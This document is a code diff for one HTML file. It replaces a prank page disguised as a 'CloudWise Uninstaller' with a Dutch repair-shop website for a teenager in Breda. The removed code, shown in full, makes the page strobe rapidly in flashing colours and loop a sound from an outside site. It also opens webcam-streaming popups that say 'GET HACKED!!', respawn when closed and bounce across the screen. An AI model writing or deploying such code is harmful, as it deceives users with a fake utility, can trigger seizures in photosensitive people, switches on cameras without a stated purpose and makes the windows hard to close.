@@ -1,131 +1,156 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="nl">
 <head>
     <meta charset="UTF-8">
-    <title>CloudWise Uninstaller</title>
-    <style>
-        body { background: #f5f5f5; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        @keyframes strobe { 0% { background-color: #000; } 33% { background-color: #f00; } 66% { background-color: #fff; } 100% { background-color: #000; } }
-        .flash-active { animation: strobe 0.1s infinite; }
-        #box { border: 1px solid #ddd; padding: 40px; background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 500px; color: #333; border-radius: 8px; }
-        h1 { font-weight: bold; margin: 0 0 10px 0; font-size: 1.8rem; color: #2c3e50; }
-        p { margin: 5px 0; font-size: 0.95rem; color: #555; }
-        .info-section { background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 15px 0; text-align: left; }
-        button { background: #e74c3c; color: #fff; border: none; padding: 12px 20px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; border-radius: 5px; margin-top: 20px; transition: background 0.3s; }
-        button:hover { background: #c0392b; }
-        .progress-bar { width: 100%; height: 20px; background: #ecf0f1; border-radius: 3px; margin: 10px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: #27ae60; width: 0%; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Michiel fikst't | Elektronica & E-bike Reparatie Breda</title>
+    <link rel="stylesheet" href="style.css">
 </head>
-<body id="mainBody">
+<body>
+    <header>
+        <div class="container">
+            <div class="logo-wrapper">
+                <h1 class="logo-text">Michiel fikst't</h1>
+                <div class="hammer-tool">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M19.5,2H22V9H19.5L15,13.5V16L12,19L11,18L8,21L3,16L4,15L7,18L10,15L9,14V11.5L13.5,7V4.5L18,0L19.5,2Z" />
+                    </svg>
+                </div>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#diensten">Diensten</a></li>
+                    <li><a href="#over-mij">Over Mij</a></li>
+                    <li><a href="#locatie">Locatie</a></li>
+                    <li><a href="#contact">Afspraak Maken</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
 
-<div id="box">
-    <h1>🔧 CloudWise Uninstaller</h1>
-    <p>Versie 2.1.4</p>
-    <div class="info-section">
-        <p><strong>Applicatie:</strong> CloudWise Sync Manager</p>
-        <p><strong>Grootte:</strong> 247 MB</p>
-        <p><strong>Status:</strong> Geïnstalleerd</p>
-    </div>
-    <p style="text-align: center; margin-top: 20px;">Klik de knop hieronder om CloudWise volledig te verwijderen:</p>
-    <button onclick="check()">KLIK HIER OM CLOUDWISE TE VERWIJDEREN</button>
-</div>
+    <section id="hero">
+        <div class="container">
+            <h2>Jouw expert in reparatie in Breda</h2>
+            <p>Van kapotte e-bikes tot weigerende elektronica: Michiel fikst 't!</p>
+                <p class="hero-price" data-binary="01001101">Slechts €9 per uur!</p>
+            <a href="#contact" class="btn btn-pulse">Maak een afspraak</a>
+        </div>
+    </section>
 
-<script>
-    const sound = new Audio("https://www.myinstants.com/media/sounds/nggr.mp3");
-    sound.loop = true;
+    <section id="diensten">
+        <div class="container">
+            <h2>Onze Diensten</h2>
+            <p>Ik reken een vast tarief van <strong>€9 per uur</strong> voor al mijn reparatiewerkzaamheden.</p>
+            <p><small><strong>DISCLAIMER:</strong> vervangende onderdelen niet inbegrepen.</small></p>
+            <div class="services-grid">
+                <div class="service-card">
+                    <h3>Elektronica Reparatie</h3>
+                    <p>Heeft je laptop, tablet of ander elektronisch apparaat kuren? Ik kijk er graag naar en herstel het vakkundig.</p>
+                </div>
+                <div class="service-card">
+                    <h3>E-bike Service</h3>
+                    <p>Problemen met de motor, accu of display van je elektrische fiets? Ik zorg dat je snel weer de weg op kunt.</p>
+                </div>
+                <div class="service-card">
+                    <h3>Service aan huis</h3>
+                    <p>Geen tijd om langs te komen? Geen probleem, ik kan ook bij jou langskomen in Breda!</p>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    let cameraWins = [];
-    let normalWins = [];
+    <section id="over-mij" class="bg-light">
+        <div class="container">
+            <h2>Over Michiel</h2>
+            <p>Hoi, ik ben Michiel. Ik ben 13 jaar oud en heb een enorme passie voor techniek. Met mijn ervaring help ik mensen in Breda en omstreken met het repareren van hun dierbare apparaten en e-bikes. Eerlijk advies en een snelle service voor een scherpe prijs staan bij mij voorop.</p>
+        </div>
+    </section>
 
-    function check() {
-        startChaos();
-    }
+    <section id="locatie">
+        <div class="container">
+            <h2>Locatie</h2>
+            <p>Je kunt bij mij langskomen op de <strong>Franklin Rooseveltlaan 90, Breda</strong>. Maar zoals gezegd: ik kom ook graag naar jou toe!</p>
+            <div class="map-placeholder">
+                <p>📍 Franklin Rooseveltlaan 90, Breda, Nederland</p>
+            </div>
+        </div>
+    </section>
 
-    function startChaos() {
-        sound.play();
-        document.getElementById('mainBody').classList.add('flash-active');
-        smartSpawn();
-        setInterval(smartSpawn, 3000);
-    }
+    <section id="contact">
+        <div class="container">
+            <h2>Afspraak Maken</h2>
+            <p>Vul het formulier hieronder in om een afspraak aan te vragen. Ik neem zo snel mogelijk contact met je op om de afspraak te bevestigen.</p>
+            <form id="appointment-form">
+                <div class="form-group">
+                    <label for="name">Naam:</label>
+                    <input type="text" id="name" name="name" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">E-mail of Telefoon:</label>
+                    <input type="text" id="contact_info" name="contact_info" required>
+                </div>
+                <div class="form-group">
+                    <label for="device">Wat moet er gefikst worden?</label>
+                    <input type="text" id="device" name="device" placeholder="Bijv. Laptop, E-bike accu..." required>
+                </div>
+                <div class="form-group">
+                    <label for="service_type">Type Service:</label>
+                    <select id="service_type" name="service_type">
+                        <option value="werkplaats">Ik kom naar de Franklin Rooseveltlaan</option>
+                        <option value="thuis">Michiel komt naar mij toe</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="message">Bericht / Toelichting:</label>
+                    <textarea id="message" name="message"></textarea>
+                </div>
+                <button type="submit" class="btn">Afspraak Aanvragen</button>
+            </form>
+            <div id="form-feedback" style="display:none; margin-top: 20px; padding: 15px; border-radius: 5px; background: #d4edda; color: #155724;">
+                Bedankt! Je aanvraag is verstuurd. Ik neem snel contact met je op.
+            </div>
+            <div class="disclaimer" style="margin-top: 30px; font-size: 0.8rem; color: #777; border-top: 1px solid #ddd; padding-top: 10px;">
+                <p><em>Let op: Dit is een prototype van het afsprakensysteem. In een echte website zouden deze gegevens direct naar Michiel worden gestuurd via e-mail of een database. Voor een werkende oplossing raad ik een service zoals <a href="https://formspree.io/" target="_blank">Formspree</a> aan.</em></p>
+            </div>
+        </div>
+    </section>
 
-    function smartSpawn() {
-        cameraWins = cameraWins.filter(w => !w.closed);
-        normalWins = normalWins.filter(w => !w.closed);
-        if (cameraWins.length < 5) spawn(true);
-        else if (normalWins.length < 10) spawn(false);
-    }
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 Michiel fikst't. Alle rechten voorbehouden.</p>
+            <p><small><a href="admin.html" style="color:rgba(255,255,255,0.3); text-decoration:none;">Beheer</a></small></p>
+        </div>
+        <div class="hidden-gear" title="Klik niet op mij!">
+            <svg viewBox="0 0 24 24">
+                <path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.35 19.43,11.03L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.47,5.34 14.86,5.12L14.47,2.46C14.43,2.23 14.22,2.06 14,2.06H10C9.78,2.06 9.57,2.23 9.53,2.46L9.14,5.12C8.53,5.34 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.22,8.95 2.27,9.22 2.46,9.37L4.57,11.03C4.53,11.35 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.22,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.04 4.95,18.95L7.44,17.95C7.96,18.34 8.53,18.66 9.14,18.88L9.53,21.54C9.57,21.77 9.78,21.94 10,21.94H14C14.22,21.94 14.43,21.77 14.47,21.54L14.86,18.88C15.47,18.66 16.04,18.34 16.56,17.95L19.05,18.95C19.27,19.04 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z" />
+            </svg>
+        </div>
+    </footer>
 
-    function spawn(isCamera) {
-        const w = 350, h = 300;
-        let curX = Math.floor(Math.random() * (screen.availWidth - w));
-        let curY = Math.floor(Math.random() * (screen.availHeight - h));
+    <script>
+        document.getElementById('appointment-form').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-        const win = window.open("", "", `width=${w},height=${h},left=${curX},top=${curY}`);
+            const appointment = {
+                id: Date.now(),
+                name: document.getElementById('name').value,
+                contact: document.getElementById('contact_info').value,
+                device: document.getElementById('device').value,
+                service_type: document.getElementById('service_type').value,
+                message: document.getElementById('message').value,
+                status: 'wachtend',
+                date: new Date().toLocaleString()
+            };
 
-        if (win) {
-            win.document.write(`
-                <html>
-                <head>
-                    <style>
-                        @keyframes strobe { 0% { background:#000; } 50% { background:#f00; } 100% { background:#fff; } }
-                        body { animation: strobe 0.08s infinite; color:white; font-family:sans-serif; text-align:center; overflow:hidden; margin:0; border:10px solid black; }
-                    </style>
-                </head>
-                <body>
-                    ${isCamera ? '<video id="v" autoplay style="width:100%; height:180px; object-fit:cover;"></video>' : '<h1 style="font-size:100px;">💀</h1>'}
-                    <h1>GET HACKED!!</h1>
-                    <script>
-                        ${isCamera ? 'navigator.mediaDevices.getUserMedia({ video: true }).then(s => { document.getElementById("v").srcObject = s; });' : ''}
-                        
-                        // New absolute movement engine
-                        let x = ${curX}, y = ${curY};
-                        let dx = ${Math.random() > 0.5 ? 15 : -15}; 
-                        let dy = ${Math.random() > 0.5 ? 15 : -15};
-                        const width = 350, height = 300;
+            // Get existing appointments
+            let appointments = JSON.parse(localStorage.getItem('appointments') || '[]');
+            appointments.push(appointment);
+            localStorage.setItem('appointments', JSON.stringify(appointments));
 
-                        function bounce() {
-                            x += dx;
-                            y += dy;
-
-                            // Collision detection with absolute screen bounds
-                            if (x + width >= screen.availWidth || x <= 0) {
-                                dx = -dx;
-                                // Force away from edge to prevent sticking
-                                x = (x <= 0) ? 5 : screen.availWidth - width - 5;
-                            }
-                            if (y + height >= screen.availHeight || y <= 0) {
-                                dy = -dy;
-                                // Force away from edge to prevent sticking
-                                y = (y <= 0) ? 5 : screen.availHeight - height - 5;
-                            }
-
-                            window.moveTo(x, y);
-                        }
-                        
-                        // Start moving after 10 seconds
-                        setTimeout(() => {
-                            // kick once then run repeatedly for smooth motion
-                            bounce();
-                            setInterval(bounce, 10);
-                        }, 10000);
-                    <\/script>
-                </body>
-                </html>
-            `);
-
-            if (isCamera) cameraWins.push(win);
-            else normalWins.push(win);
-
-            const checkClosed = setInterval(() => {
-                if (win.closed) {
-                    clearInterval(checkClosed);
-                    setTimeout(smartSpawn, 100);
-                    setTimeout(smartSpawn, 200);
-                }
-            }, 500);
-        }
-    }
-</script>
+            // Show feedback
+            document.getElementById('appointment-form').style.display = 'none';
+            document.getElementById('form-feedback').style.display = 'block';
+        });
+    </script>
 </body>
 </html>
